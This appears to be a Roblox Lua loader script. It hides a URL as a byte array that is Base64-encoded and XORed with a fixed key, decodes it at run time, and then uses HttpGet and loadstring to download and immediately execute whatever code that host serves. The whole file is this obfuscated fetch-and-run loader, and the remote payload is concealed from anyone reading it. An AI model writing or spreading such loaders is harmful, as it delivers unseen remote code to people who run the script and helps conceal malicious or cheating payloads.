local key = 137

local encrypted = {52,102,51,57,43,102,113,122,112,113,98,55,54,80,54,110,55,117,68,57,52,102,122,114,47,80,114,115,43,43,114,109,53,47,51,115,53,47,50,110,54,117,98,107,112,117,118,109,47,101,68,105,117,76,67,57,118,97,84,53,52,80,72,115,53,97,98,107,52,79,102,115,54,118,118,111,55,47,50,107,55,43,106,116,55,79,114,108,52,79,122,110,47,97,98,55,55,79,47,54,112,117,72,115,54,79,51,54,112,117,84,111,52,79,101,109,53,79,106,103,53,54,102,108,47,79,103,61}

local function b64decode(data)
    local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local t = {}
    for i = 1, #data do
        local char = data:sub(i,i)
        local idx = b64:find(char)
        if idx then t[#t+1] = idx - 1 end
    end
    local out = {}
    for i = 1, #t, 4 do
        local a,b,c,d = t[i], t[i+1], t[i+2], t[i+3]
        out[#out+1] = bit32.rshift(a*4 + bit32.rshift(b or 0, 4), 0) % 256
        if c then out[#out+1] = bit32.rshift((b%16)*16 + bit32.rshift(c or 0, 2), 0) % 256 end
        if d then out[#out+1] = bit32.rshift((c%4)*64 + d, 0) % 256 end
    end
    return string.char(unpack(out))
end

local function decrypt()
    local b64str = ""
    for _, v in ipairs(encrypted) do
        b64str = b64str .. string.char(v)
    end
    local xorred = b64decode(b64str)
    local url = ""
    for i = 1, #xorred do
        url = url .. string.char(bit32.bxor(xorred:byte(i), key))
    end
    return url
end

loadstring(game:HttpGet(decrypt()))()
